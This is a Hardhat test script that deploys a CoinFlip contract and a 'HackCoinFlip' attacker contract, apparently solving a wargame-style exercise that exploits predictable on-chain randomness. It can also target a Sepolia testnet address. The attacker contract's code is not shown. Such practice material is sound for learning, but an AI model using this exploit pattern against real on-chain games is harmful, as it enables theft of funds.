import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { CoinFlip__factory, HackCoinFlip__factory } from "../../typechain-types/factories/security/CoinFlip.sol";
import { CoinFlip, HackCoinFlip } from "../../typechain-types/security/CoinFlip.sol";
import { createWallet, tx2contract } from "../sdk";
const hre = require('hardhat');

describe("Hack CoinFlip", function () {
  this.timeout(6000000);

  let owner: SignerWithAddress;
  let c : CoinFlip
  let hc : HackCoinFlip

  before(async () => {
    const signers = await ethers.getSigners()
    owner = signers[0];
    console.log("owner : ", owner.address)

  });

  it("Deploy CoinFlip", async function () {
		if (hre.hardhatArguments.network == undefined) {
      c = await new CoinFlip__factory(owner).deploy()
      console.log("c address : ", c.address)
    }
  });

  it("Deploy HackCoinFlip", async function () {
    let COINFLIP_CONTRACT_ADDR
		if (hre.hardhatArguments.network == undefined) {
      COINFLIP_CONTRACT_ADDR = c.address
    } else {
      COINFLIP_CONTRACT_ADDR = "0x448C17C93024580D2e2e4b570A308C4Dce3D8875"
    }
    hc = await new HackCoinFlip__factory(owner).deploy(COINFLIP_CONTRACT_ADDR)
    console.log("hc address : ", hc.address)
  });

  it("win consecutive 10 times", async function () {
    let signer = owner

    async function tx2hackcoinflip() {
      
      const abi = [
        "function flip() external returns(bool)"
      ]
    
      const TX_VALUE = ethers.utils.parseEther("0")
      const TX_GAS_LIMIT = BigInt(1000000)
      await tx2contract(
        hc.address,
        abi,
        "flip",
        [],
        signer,
        TX_VALUE.toBigInt(),
        TX_GAS_LIMIT
      )
    }

    const WIN_NUM= 1
    for (let i = 0; i < WIN_NUM; i++) {
      await tx2hackcoinflip()
    }

		if (hre.hardhatArguments.network == undefined) {
      expect(await (await c.consecutiveWins()).toNumber()).eq(WIN_NUM)
    }
  });

});



// Test : yarn hardhat test test/security/CoinFlip.ts --network sepolia